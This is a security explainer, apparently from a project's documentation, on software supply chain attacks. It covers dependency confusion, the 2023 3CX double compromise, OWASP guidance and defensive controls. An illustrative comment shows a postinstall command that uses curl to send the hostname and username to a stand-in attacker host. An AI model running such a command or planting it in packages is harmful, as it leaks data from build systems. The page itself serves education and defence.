# Software Supply Chain Attack

> An attacker compromises a piece of software, tooling, or dependency that a target organisation trusts, so that malicious code reaches production systems without ever touching the target directly.

## What it is

A software supply chain attack exploits the trust a development team places in external code — third-party libraries, build tools, container base images, CI/CD plugins, or even the version-control platform itself. Rather than breaking through the target's perimeter, the adversary inserts a payload upstream at a point where it will be pulled in automatically: a poisoned npm package, a backdoored dependency, a compromised build server. Because the malicious artifact arrives through a trusted channel (package registry, signed release, internal mirror), standard endpoint and network defences rarely raise an alert at ingestion time. The attack surface spans every stage from source commit to running container: source-code repositories, dependency registries, build pipelines, artifact stores, and deployment tooling are all viable entry points.

## How the attack works

1. **Target selection.** The adversary identifies a widely-depended-upon package, build tool, or CI service used by the intended victim — or a vendor in the victim's software supply chain.
2. **Compromise or impersonation.** The attacker either seizes control of a legitimate package (credential theft, account takeover, typosquatting) or introduces a dependency confusion package that exploits internal-vs-public namespace resolution.
3. **Payload insertion.** Malicious code is added to a release — typically in an install script (`postinstall`), a build hook, or directly in library source. The payload may be dormant until certain environment variables or hostnames are detected, making sandbox detection harder.
4. **Propagation via trust.** Downstream consumers update their lockfiles or pull the latest image tag. CI pipelines run the tainted artifact with elevated permissions (network egress, secret access, registry push rights).
5. **Execution and exfiltration.** The payload executes in the victim's build or runtime environment, commonly to exfiltrate secrets, establish persistence, or open a beachhead for lateral movement.

**Illustrative example — dependency confusion in a private registry setup:**

```
# A company uses an internal package "@company/auth-utils" hosted on a private registry.
# An attacker publishes a public "@company/auth-utils" at a higher version (e.g. 9.9.9)
# to the public npm registry.
#
# If the package manager is misconfigured to check public registries before private ones,
# the next `npm install` silently pulls the attacker's version instead of the internal one.
#
# The malicious package's postinstall script runs immediately:
#   node -e "require('child_process').exec('curl attacker.invalid/collect?h=$(hostname)&u=$(whoami)')"
#
# This is ILLUSTRATIVE only — it targets no real package or organisation.
```

The key mechanic is that no defensive alert fires: the package manager considers the resolution legitimate, the CI runner executes the install step with its normal credentials, and the exfiltration looks like routine outbound HTTP.

## Real-world impact

In March 2023, the voice-over-IP vendor **3CX** suffered what security researchers described as a double supply chain compromise. A 3CX employee had, in 2022, installed a trojanised version of the `X_Trader` platform — itself a legitimately signed but backdoored build from financial software vendor Trading Technologies. That initial compromise gave the Lazarus Group (North Korea, tracked by Microsoft as "Diamond Sleet") a foothold inside 3CX's build infrastructure. From there, the attackers modified the Windows and macOS desktop-app build environments so that the resulting signed installers carried a stealer payload (`ICONICSTEALER`) capable of harvesting credentials and browser history. 3CX serves roughly 600,000 customers and 12 million users across sectors including aerospace and healthcare, meaning a single poisoned build propagated malicious code to an enormous downstream population before detection. The incident is notable because the initial intrusion vector was itself a supply chain attack — demonstrating that these compromises can chain arbitrarily deep through a vendor graph.

Source: Brian Krebs, *3CX Breach Was a Double Supply Chain Compromise*, Krebs on Security, 20 April 2023.

## OWASP classification

OWASP addresses this attack class directly in its Cheat Sheet Series. The guidance covers threats across four domains — source code, build environment, dependency management, and deployment/runtime — and prescribes layered controls including SBOM generation, provenance verification (SLSA), code signing, and automated Software Composition Analysis (SCA).

Reference: [Software Supply Chain Security — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Software_Supply_Chain_Security_Cheat_Sheet.html)

## How defenders stop it

- **Pin and verify dependencies.** Commit lockfiles (`package-lock.json`, `pnpm-lock.yaml`, `go.sum`, `Cargo.lock`) and use integrity hashes (`npm ci`, `--frozen-lockfile`). Never resolve floating version ranges in production builds.
- **Scope your package registries.** Explicitly configure which registry namespace maps to which source (`.npmrc` `@scope:registry`). Never allow public registries to silently override private ones.
- **Generate and audit an SBOM.** Produce a Software Bill of Materials at build time and diff it on every dependency update. Tools: `syft`, `cyclonedx-npm`, `cargo-cyclonedx`.
- **Run Software Composition Analysis (SCA).** Automated scanners (`Trivy`, `Grype`, `npm audit`, `osv-scanner`) must run in CI and block merges on critical CVEs.
- **Isolate and harden build environments.** Build pipelines should run with minimal permissions, no ambient cloud credentials, and ephemeral runners. Secrets must be injected at runtime, never baked into images.
- **Enforce code signing and provenance.** Sign release artifacts with `cosign` or equivalent; verify signatures before deployment. Adopt SLSA build levels to formalise provenance attestation.
- **Monitor for typosquatting and namespace confusion.** Alert when a public package name matches a private internal package at a higher version.
- **Rotate credentials on suspicious builds.** Any unexpected outbound connection or anomalous file access during a build should trigger credential rotation and pipeline quarantine.
- **Audit transitive dependencies.** Direct dependencies carry their own dependency trees. Periodic deep audits (`pnpm why`, `go mod graph`) surface hidden exposure.

In this project, see the defenses: [grobase](../defense/grobase/supply-chain-security.md), [opposite-osiris](../defense/opposite-osiris/supply-chain-security.md), [platform](../defense/platform/supply-chain-security.md).

## References

- [Software Supply Chain Security — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Software_Supply_Chain_Security_Cheat_Sheet.html)
- [3CX Breach Was a Double Supply Chain Compromise — Krebs on Security (2023-04-20)](https://krebsonsecurity.com/2023/04/3cx-breach-was-a-double-supply-chain-compromise/)
